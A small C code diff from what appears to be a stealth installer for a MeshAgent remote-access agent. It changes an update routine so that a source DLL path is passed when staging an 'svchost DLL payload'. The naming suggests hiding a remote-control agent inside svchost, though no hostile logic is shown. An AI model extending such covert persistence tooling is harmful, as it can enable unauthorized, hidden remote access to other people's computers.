@@ -2583,7 +2583,6 @@ static BOOL Stealth_PrepareUpdateTransaction(const StealthInstallPaths* paths, c
     const wchar_t* mshLeaf = NULL;
     const wchar_t* defaultMshLeaf = L"MeshAgent.msh";
     if (paths == NULL || tx == NULL) { return FALSE; }
-    UNREFERENCED_PARAMETER(sourceDllPath);
     ZeroMemory(tx, sizeof(*tx));
 
     wchar_t stateDir[MAX_PATH] = {0};
@@ -2674,7 +2673,7 @@ static BOOL Stealth_PrepareUpdateTransaction(const StealthInstallPaths* paths, c
         Stealth_LogInstallEvent(L"[UPDATE] Binary-only update retaining installed provisioning .msh (%ls)", tx->liveMshPath);
     }
 
-    if (!Stealth_EnsureSvchostDllFile(sourceExePath, NULL, tx->stagedDllPath))
+    if (!Stealth_EnsureSvchostDllFile(sourceExePath, sourceDllPath, tx->stagedDllPath))
     {
         Stealth_LogInstallEvent(L"[UPDATE] Unable to stage a valid svchost DLL payload");
         return FALSE;
